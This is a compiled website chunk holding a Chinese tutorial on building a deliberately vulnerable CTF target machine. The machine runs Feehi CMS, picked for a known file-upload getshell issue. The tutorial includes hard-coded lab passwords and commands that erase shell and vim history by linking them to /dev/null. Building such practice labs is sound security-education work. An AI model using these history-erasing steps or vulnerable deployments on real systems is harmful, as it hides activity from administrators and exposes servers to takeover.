(window.webpackJsonp=window.webpackJsonp||[]).push([[124],{488:function(s,a,t){"use strict";t.r(a);var e=t(11),r=Object(e.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("blockquote",[a("p",[s._v("Search 靶机构建流程示例")])]),s._v(" "),a("p",[s._v("一份出题模板参考，实际出题时可根据需求灵活调整。")]),s._v(" "),a("h2",{attrs:{id:"_1、构建工具"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1、构建工具"}},[s._v("#")]),s._v(" 1、构建工具")]),s._v(" "),a("ul",[a("li",[s._v("VirtualBox")]),s._v(" "),a("li",[s._v("模板ova文件")]),s._v(" "),a("li",[s._v("Tabby（ssh客户端）")])]),s._v(" "),a("p",[s._v("VBox优势：跨平台、免费、开源、导出分发ova文件方便、兼容性好")]),s._v(" "),a("h2",{attrs:{id:"_2、导入靶机"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2、导入靶机"}},[s._v("#")]),s._v(" 2、导入靶机")]),s._v(" "),a("p",[s._v("找群里有出题经验的群友求助一份模板 ova，导入模板 ova 文件")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/3.png",alt:""}})]),s._v(" "),a("p",[s._v("导入后，可能需要调整到物理网卡桥接模式，校园网的话，可能限制设备数量，可以选择仅主机模式。")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/4.png",alt:""}})]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/5.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"_3、ssh登录靶机"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3、ssh登录靶机"}},[s._v("#")]),s._v(" 3、SSH登录靶机")]),s._v(" "),a("p",[s._v("我这个版本的模板 ova，默认用户名密码是 root/todd、welcome/todd，使用 Tabby SSH 登录到 root 用户")]),s._v(" "),a("h3",{attrs:{id:"移除默认welcome用户"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#移除默认welcome用户"}},[s._v("#")]),s._v(" 移除默认welcome用户")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("deluser --remove-home welcome\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h3",{attrs:{id:"添加普通用户-7r1umphk"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#添加普通用户-7r1umphk"}},[s._v("#")]),s._v(" 添加普通用户 7r1umphk")]),s._v(" "),a("blockquote",[a("p",[s._v("-m 表示创建用户的同时创建用户主目录， -s 指定用户登录后使用的 shell，-d 指定用户主目录位置")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("useradd")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-m")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-s")]),s._v(" /bin/bash "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-d")]),s._v(" /home/7r1umphk 7r1umphk\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h3",{attrs:{id:"生成密码"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#生成密码"}},[s._v("#")]),s._v(" 生成密码")]),s._v(" "),a("blockquote",[a("p",[s._v("生成一个18字节的随机字符串，经过 base64 编码后长度为24字符，可以作为一个强密码使用")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("openssl rand "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-base64")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("18")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h3",{attrs:{id:"设置密码"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#设置密码"}},[s._v("#")]),s._v(" 设置密码")]),s._v(" "),a("blockquote",[a("p",[s._v("chpasswd 命令可以通过管道输入的方式批量修改用户密码，格式为 用户名:密码")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"root:mxmrtLHzuBk4vDpfFghRkDZI"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" chpasswd\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"7r1umphk:P3JkplQF5G255aUJWBRKEmzp"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" chpasswd\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-mao/6.png",alt:""}})]),s._v(" "),a("h3",{attrs:{id:"清理历史命令"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#清理历史命令"}},[s._v("#")]),s._v(" 清理历史命令")]),s._v(" "),a("p",[s._v("擦除痕迹，避免 .bash_history 文件里遗漏历史命令，仅用于实验靶机，生产环境请勿这样做")]),s._v(" "),a("blockquote",[a("p",[s._v("实际上内存中的 shell 历史、journal、其他服务日志、命令行参数等仍然会存在日志记录。")])]),s._v(" "),a("p",[s._v("root 用户")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("rm")]),s._v(" /root/.bash_history\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("rm")]),s._v(" /root/.viminfo\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ln")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-sf")]),s._v(" /dev/null /root/.bash_history\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ln")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-sf")]),s._v(" /dev/null /root/.viminfo\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("普通用户 7r1umphk")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("rm")]),s._v(" /home/7r1umphk/.bash_history\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("rm")]),s._v(" /home/7r1umphk/.viminfo\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ln")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-sf")]),s._v(" /dev/null /home/7r1umphk/.bash_history\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ln")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-sf")]),s._v(" /dev/null /home/7r1umphk/.viminfo\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("h3",{attrs:{id:"修改主机名"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#修改主机名"}},[s._v("#")]),s._v(" 修改主机名")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("hostnamectl set-hostname Search\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'127.0.0.1 Search'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">>")]),s._v(" /etc/hosts\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("su")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-mao/7.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"_4、部署-web-环境"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_4、部署-web-环境"}},[s._v("#")]),s._v(" 4、部署 Web 环境")]),s._v(" "),a("h3",{attrs:{id:"基础环境检查"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#基础环境检查"}},[s._v("#")]),s._v(" 基础环境检查")]),s._v(" "),a("p",[s._v("模板是已经配置好了 apache 以 www-data 用户在 80 端口运行的 PHP+apache web 环境。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 查看 apache 的运行用户")]),s._v("\nroot@Search:~"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# grep -v '^#' /etc/apache2/apache2.conf ")]),s._v("\nUser www-data\nGroup www-data\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 查看 apache 的 web 根目录")]),s._v("\nroot@Search:~"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# grep -v '^#' /etc/apache2/sites-enabled/000-default.conf")]),s._v("\nDocumentRoot /var/www/html\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 查看 apache 启用的 php 版本")]),s._v("\nroot@Search:~"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# ls /etc/apache2/mods-enabled/ | grep php")]),s._v("\nphp8.3.conf\nphp8.3.load\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br")])]),a("h3",{attrs:{id:"php-配置检查"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#php-配置检查"}},[s._v("#")]),s._v(" php 配置检查")]),s._v(" "),a("p",[s._v("在 /var/www/html/ 下创建一个 index.php 文件，内容如下：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" /var/www/html\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("rm")]),s._v(" index.html\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'<?=phpinfo();?>'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" /var/www/html/index.php\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("从 phpinfo 信息里找到 php.ini 配置文件路径，确认配置文件位置正确，且配置符合预期。")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/8.png",alt:""}})]),s._v(" "),a("p",[s._v("模板默认禁用了一些函数，根据你的需求灵活调整，php配置文件通过上面可以知道在 "),a("code",[s._v("/etc/php/8.3/apache2/php.ini")]),s._v("，可以在配置文件里修改禁用函数。")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/9.png",alt:""}})]),s._v(" "),a("p",[s._v("调试完，删除 index.php 文件")]),s._v(" "),a("h3",{attrs:{id:"部署-feehi-cms"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#部署-feehi-cms"}},[s._v("#")]),s._v(" 部署 Feehi CMS")]),s._v(" "),a("p",[s._v("Feehi CMS地址："),a("a",{attrs:{href:"https://github.com/liufee/cms",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://github.com/liufee/cms"),a("OutboundLink")],1),s._v("\n文件上传getshell issue地址："),a("a",{attrs:{href:"https://github.com/liufee/cms/issues/70",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://github.com/liufee/cms/issues/70"),a("OutboundLink")],1)]),s._v(" "),a("p",[s._v("根据项目的 README 说明，部署 Feehi CMS")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/10.png",alt:""}})]),s._v(" "),a("p",[s._v("使用 wget 下载源码到本地，没有wget，使用busybox自带的 wget 命令，下载完成后解压到 /var/www/html 目录下")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("root@Search:/var/www/html"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# busybox wget http://resource-1251086492.cossh.myqcloud.com/Feehi_CMS.zip")]),s._v("\nConnecting to resource-1251086492.cossh.myqcloud.com "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("36.155")]),s._v(".210.171:80"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nFeehi_CMS.zip        "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("100")]),s._v("% "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("***********************************************************************************************************"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("38")]),s._v(".3M  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(":00:00 ETA\nroot@Search:/var/www/html"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# ls")]),s._v("\nFeehi_CMS.zip\nroot@Search:/var/www/html"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# unzip Feehi_CMS.zip -d /var/www/html/")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-mao/11.png",alt:""}})]),s._v(" "),a("p",[s._v("然后在第二个配置文档说明，配置一下 apache web根目录"),a("a",{attrs:{href:"https://github.com/liufee/cms/blob/master/docs/WEBSERVER_CONFIG.md",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://github.com/liufee/cms/blob/master/docs/WEBSERVER_CONFIG.md"),a("OutboundLink")],1)]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/12.png",alt:""}})]),s._v(" "),a("p",[s._v("修改 /etc/apache2/sites-available/000-default.conf 文件，把 apache 配置部分写进去 "),a("a",{attrs:{href:"https://github.com/liufee/cms/blob/master/docs/WEBSERVER_CONFIG.md",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://github.com/liufee/cms/blob/master/docs/WEBSERVER_CONFIG.md"),a("OutboundLink")],1)]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("vim")]),s._v(" /etc/apache2/sites-available/000-default.conf\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-mao/13.png",alt:""}})]),s._v(" "),a("p",[s._v("重启 apache 服务")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("systemctl restart apache2\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("把 /var/www/html/ 目录权限改为 www-data 用户和用户组")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chown")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-R")]),s._v(" www-data:www-data /var/www/html/\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("在这个 CMS 推荐的 apache 配置文件里，有关于 RewriteEngine 的 VirtualHost 配置，需要启用一下 rewrite 模块")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("root@Search:/var/www/html"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# # 启用rewrite模块")]),s._v("\nroot@Search:/var/www/html"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# sudo a2enmod rewrite")]),s._v("\nEnabling module rewrite.\nTo activate the new configuration, you need to run:\n  systemctl restart apache2\nroot@Search:/var/www/html"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# ")]),s._v("\nroot@Search:/var/www/html"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# # 检查模块是否启用")]),s._v("\nroot@Search:/var/www/html"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# sudo apache2ctl -M | grep rewrite")]),s._v("\nAH00558: apache2: Could not reliably determine the server"),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'s fully qualified domain name, using 127.0.0.1. Set the '")]),s._v("ServerName' directive globally to suppress this message\n rewrite_module "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("shared"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br")])]),a("p",[s._v("同时修改 apache 主配置文件，允许 CMS 的 .htaccess 文件生效")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("vim")]),s._v(" /etc/apache2/apache2.conf\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-mao/14.png",alt:""}})]),s._v(" "),a("p",[s._v("配置一个 ServerName，随便配置一个，就叫 search.todd 吧，再检查语法")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'127.0.0.1 search.todd'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">>")]),s._v(" /etc/hosts\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'ServerName search.todd'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">>")]),s._v(" /etc/apache2/apache2.conf\napache2ctl configtest\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-mao/17.png",alt:""}})]),s._v(" "),a("h3",{attrs:{id:"安装-mysql-数据库"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#安装-mysql-数据库"}},[s._v("#")]),s._v(" 安装 mysql 数据库")]),s._v(" "),a("p",[s._v("由于当前模板使用的是已结束生命周期的 Debian 10，且源已被移至归档仓库，所以使用 apt 安装 mysql/mariadb 的成本较高。为简化出题流程，这里直接使用官方 MySQL 5.7 的二进制包手动部署。")]),s._v(" "),a("p",[s._v("我选择官网下载二进制安装包"),a("a",{attrs:{href:"https://downloads.mysql.com/archives/community/",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://downloads.mysql.com/archives/community/"),a("OutboundLink")],1)]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/19.png",alt:""}})]),s._v(" "),a("p",[s._v("去阿里云镜像下载速度更快 "),a("a",{attrs:{href:"https://mirrors.aliyun.com/mysql/MySQL-5.7/mysql-5.7.38-linux-glibc2.12-x86_64.tar.gz",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://mirrors.aliyun.com/mysql/MySQL-5.7/mysql-5.7.38-linux-glibc2.12-x86_64.tar.gz"),a("OutboundLink")],1)]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/20.png",alt:""}})]),s._v(" "),a("p",[s._v("下载 mysql 二进制包，这些东西建议 windows 本地下载完成上传到靶机")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" /tmp\nbusybox "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("wget")]),s._v(" https://mirrors.aliyun.com/mysql/MySQL-5.7/mysql-5.7.38-linux-glibc2.12-x86_64.tar.gz\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("解压到 /usr/local/ 目录")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 1. 解压到 /usr/local")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("tar")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-zxvf")]),s._v(" mysql-5.7.38-linux-glibc2.12-x86_64.tar.gz "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-C")]),s._v(" /usr/local/\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" /usr/local\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("创建软链接")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ln")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-s")]),s._v(" mysql-5.7.38-linux-glibc2.12-x86_64 mysql\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("创建mysql用户和组")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("groupadd")]),s._v(" mysql\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("useradd")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-r")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-g")]),s._v(" mysql "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-s")]),s._v(" /bin/false mysql "),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("2")]),s._v(">")]),s._v("/dev/null\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("设置权限")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chown")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-R")]),s._v(" mysql:mysql /usr/local/mysql\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chmod")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-R")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("755")]),s._v(" /usr/local/mysql\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-mao/23.png",alt:""}})]),s._v(" "),a("p",[s._v("初始化mysql")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 1. 创建数据目录")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mkdir")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" /var/lib/mysql\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chown")]),s._v(" mysql:mysql /var/lib/mysql\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 2. 初始化数据库（关键步骤！）")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" /usr/local/mysql\nbin/mysqld "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--initialize")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--user")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("mysql "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--basedir")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/usr/local/mysql "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--datadir")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/var/lib/mysql "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--explicit_defaults_for_timestamp")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[s._v("记住 mysql root密码 uXEugaqla2%d")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/24.png",alt:""}})]),s._v(" "),a("p",[s._v("创建Systemd服务")]),s._v(" "),a("div",{staticClass:"language-bash 